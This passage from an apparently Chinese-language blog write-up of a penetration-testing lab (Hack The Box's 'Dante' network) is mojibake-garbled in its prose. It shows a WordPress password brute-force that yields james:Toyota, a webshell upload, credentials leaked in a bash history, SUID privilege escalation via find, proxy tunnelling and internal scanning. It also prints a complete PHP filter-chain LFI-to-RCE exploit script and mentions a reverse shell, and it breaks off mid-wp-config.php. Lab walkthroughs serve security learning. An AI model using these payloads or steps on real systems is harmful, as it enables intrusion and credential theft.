http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwenty/</span><br><span class="line"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:05 &lt;=================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:05</span><br><span class="line"></span><br><span class="line">[i] Config Backup(s) Identified:</span><br><span class="line"></span><br><span class="line">[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">[SUCCESS] - james / Toyota                                                                                                                                                                                                      </span><br><span class="line">Trying james / Motor Time: 00:00:32 &lt;==================================================================                                                                                      &gt; (400 / 893) 44.79%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: james, Password: Toyota</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon May 15 02:15:12 2023</span><br><span class="line">[+] Requests Done: 540</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 187.165 KB</span><br><span class="line">[+] Data Received: 2.269 MB</span><br><span class="line">[+] Memory used: 262.699 MB</span><br><span class="line">[+] Elapsed time: 00:00:52</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¯¹å¸å·å¯†ç ï¼š<code>james:Toyota</code> ï¼Œå¹¶ä¸”å‘ç°<a href="http://10.10.110.100:65000/wordpress/.wp-config.php.swp">http://10.10.110.100:65000/wordpress/.wp-config.php.swp</a> ã€‚å°è¯•ç”¨è¯¥å¸å·å’Œå¯†ç ç™»å½•åå°ï¼Œå‘ç°è¿˜æ˜¯ç®¡ç†å‘˜æƒé™ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg"></a></p><p>ä¹‹ååœ¨ä¸Šä¼ ä¸»é¢˜é‚£é‡Œï¼Œä¸Šä¼ ä¸€ä¸ªwebshellï¼Œå¯ä»¥åœ¨&#x2F;wordpress&#x2F;wp-content&#x2F;uploadsçœ‹åˆ°ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg"></a></p><p>ä¹‹åèšå‰‘è¿æ¥æ‹¿åˆ°shellã€‚åœ¨homeç›®å½•ä¸‹å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ªå«jamesçš„ç”¨æˆ·ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg"></a></p><p>ç»§ç»­ç”¨ä¹‹å‰çš„å¯†ç ç™»å½•ä¸€ä¸‹æ‹¿åˆ°flagï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg"></a></p><h3 id="Show-me-the-way"><a href="#Show-me-the-way" class="headerlink" title="Show me the way"></a>Show me the way</h3><p>å‘ç°åœ¨jamesç”¨æˆ·ç›®å½•ä¸‹å­˜åœ¨.bash_histroyï¼Œä»¥ä¸‹æ˜¯å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">james@DANTE-WEB-NIX01:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">cd /home/balthazar</span><br><span class="line">rm .mysql_history</span><br><span class="line">mysql -u balthazar -p TheJoker12345!</span><br></pre></td></tr></table></figure><p>ä¹‹åå°è¯•SUIDææƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg"></a></p><p>findå‘½ä»¤å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼ææƒï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg"></a></p><p><code>find . -exec /bin/sh -p \; -quit</code>è¿›å…¥shï¼Œä¹‹åç»™&#x2F;bin&#x2F;bashè®¾ç½®SUIDä½ï¼Œå†&#x2F;bin&#x2F;bash -på³å¯ã€‚è‡³æ­¤æ‹¿åˆ°DANTE-WEB-NIX01çš„rootï¼Œåˆ«å¿˜äº†æ·»åŠ è·¯ç”±ã€‚</p><h3 id="Seclusion-is-an-illusion"><a href="#Seclusion-is-an-illusion" class="headerlink" title="Seclusion is an illusion"></a>Seclusion is an illusion</h3><p>æ¥ä¸‹æ¥ç”¨chiselæ­ä¸€æ¡ä»£ç†éš§é“ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg"></a></p><p>ç”¨fscanèµ°è¿™æ¡ä»£ç†æ‰«ä¸€ä¸‹å†…ç½‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080</span><br><span class="line">â€‹</span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">Socks5Proxy: socks5://127.0.0.1:1080</span><br><span class="line">start infoscan</span><br><span class="line">172.16.1.101:21 open</span><br><span class="line">172.16.1.10:80 open</span><br><span class="line">172.16.1.20:22 open</span><br><span class="line">172.16.1.5:21 open</span><br><span class="line">172.16.1.1:80 open</span><br><span class="line">172.16.1.12:22 open</span><br><span class="line">172.16.1.20:80 open</span><br><span class="line">172.16.1.13:80 open</span><br><span class="line">172.16.1.10:22 open</span><br><span class="line">172.16.1.100:21 open</span><br><span class="line">172.16.1.12:80 open</span><br><span class="line">172.16.1.100:22 open</span><br><span class="line">172.16.1.12:21 open</span><br><span class="line">172.16.1.19:80 open</span><br><span class="line">172.16.1.17:80 open</span><br><span class="line">172.16.1.100:80 open</span><br><span class="line">172.16.1.102:80 open</span><br><span class="line">172.16.1.5:135 open</span><br><span class="line">172.16.1.20:135 open</span><br><span class="line">172.16.1.101:135 open</span><br><span class="line">172.16.1.102:135 open</span><br><span class="line">172.16.1.5:139 open</span><br><span class="line">172.16.1.17:139 open</span><br><span class="line">172.16.1.10:139 open</span><br><span class="line">172.16.1.20:139 open</span><br><span class="line">172.16.1.102:139 open</span><br><span class="line">172.16.1.101:139 open</span><br><span class="line">172.16.1.12:443 open</span><br><span class="line">172.16.1.20:443 open</span><br><span class="line">172.16.1.1:443 open</span><br><span class="line">172.16.1.13:443 open</span><br><span class="line">172.16.1.102:443 open</span><br><span class="line">172.16.1.5:445 open</span><br><span class="line">172.16.1.10:445 open</span><br><span class="line">172.16.1.20:445 open</span><br><span class="line">172.16.1.17:445 open</span><br><span class="line">172.16.1.13:445 open</span><br><span class="line">172.16.1.101:445 open</span><br><span class="line">172.16.1.102:445 open</span><br><span class="line">172.16.1.5:1433 open</span><br><span class="line">172.16.1.12:3306 open</span><br><span class="line">172.16.1.102:3306 open</span><br><span class="line">172.16.1.19:8080 open</span><br><span class="line">172.16.1.20:88 open</span><br><span class="line">172.16.1.17:10000 open</span><br><span class="line">[*] alive ports len is: 45</span><br><span class="line">start vulscan</span><br><span class="line">å·²å®Œæˆ 0/45 [-] Ms17010 172.16.1.13 EOF</span><br><span class="line">[*] WebTitle: http://172.16.1.1         code:301 len:178    title:301 Moved Permanently è·³è½¬url: https://172.16.1.1/</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.101</span><br><span class="line">   [-&gt;]DANTE-WS02</span><br><span class="line">   [-&gt;]172.16.1.101</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.102</span><br><span class="line">   [-&gt;]DANTE-WS03</span><br><span class="line">   [-&gt;]172.16.1.102</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.5</span><br><span class="line">   [-&gt;]DANTE-SQL01</span><br><span class="line">   [-&gt;]172.16.1.5</span><br><span class="line">[*] WebTitle: http://172.16.1.12        code:302 len:0      title:None è·³è½¬url: http://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.19        code:200 len:553    title:Index of /</span><br><span class="line">[*] WebTitle: http://172.16.1.100       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle: http://172.16.1.13        code:302 len:0      title:None è·³è½¬url: http://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.17        code:200 len:963    title:Index of /</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.20</span><br><span class="line">   [-&gt;]DANTE-DC01</span><br><span class="line">   [-&gt;]172.16.1.20</span><br><span class="line">[*] WebTitle: http://172.16.1.10        code:200 len:28842  title:Dante Hosting</span><br><span class="line">[*] WebTitle: https://172.16.1.12       code:302 len:0      title:None è·³è½¬url: https://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.102       code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.102      code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.13       code:302 len:0      title:None è·³è½¬url: https://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.20        code:200 len:3173   title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.1        code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.20       code:200 len:3173   title:None</span><br><span class="line">[+] 172.16.1.20 MS17-010        (Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[*] WebTitle: http://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.19:8080   code:403 len:793    title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: https://172.16.1.1/       code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[+] http://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[+] https://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">å·²å®Œæˆ 45/45</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 8m5.925407215s</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹172.16.1.10ï¼Œåˆšåˆšfscanæ‰«åˆ°äº†22,80,139,445è¿™äº›ç«¯å£ï¼Œå…ˆè¿›ä¸€ä¸‹webç•Œé¢å§ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg"></a></p><p>éšä¾¿ç‚¹æ—è¾¹ä¸€ä¸ªæŒ‰é’®ï¼Œæ³¨æ„çœ‹ä¸Šé¢çš„é“¾æ¥ ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg"></a></p><p>çŒœæµ‹å­˜åœ¨LFIï¼Œå°è¯•è¯»ä¸€ä¸‹&#x2F;etc&#x2F;passwdï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg"></a></p><p>å¯ä»¥è¯»åˆ°ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªåä¸ºmargaretçš„ç”¨æˆ·ï¼Œåªæ˜¯å®ƒçš„shellä¸æ˜¯bashè€Œæ˜¯lshellã€‚å› ä¸ºè¿™ä¸ªç«™ç”¨çš„æ˜¯phpï¼Œå¹¶ä¸”å­˜åœ¨LFIï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ php filter chainæ¥RCEï¼Œå…³äºæ„é€ php filter chainæ¥RCEçš„æ–¹æ³•æˆ‘è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œæ‰“CTFçš„å¸ˆå‚…ä»¬åº”è¯¥æ¥è§¦è¿‡ï¼Œæƒ³è¦äº†è§£çš„å¯ä»¥çœ‹çœ‹Zeddå¸ˆå‚…å†™çš„ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://tttang.com/archive/1395/">hxp CTF 2021 â€“ The End Of LFI?</a>ã€‚è¿™ç¯‡æ–‡ç« ä»æœ€ç®€å•çš„LFIå¼€å§‹ï¼Œä¸€æ­¥æ­¥æ„é€ php filter chainä»è€Œå®ç°RCEï¼Œå¸ˆå‚…ä»¬çœ‹äº†ä¹‹åä¸€å®šä¼šå¾ˆæœ‰æ”¶è·çš„ã€‚ æˆ‘è¿™é‡Œç›´æ¥è´´è„šæœ¬å§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://172.16.1.10/nav.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"> </span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"> </span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: final_payload</span><br><span class="line">&#125;,proxies=proxies)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è„šæœ¬æ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg"></a></p><p>æ¥ä¸‹æ¥å°±åå¼¹ä¸ªshellï¼Œç›´æ¥æ”¹è„šæœ¬é‡Œçš„å‘½ä»¤å³å¯ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg"></a></p><p>ä¹‹åæˆ‘ä»¬è¯»å–&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpressç›®å½•ä¸‹çš„wp-config.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 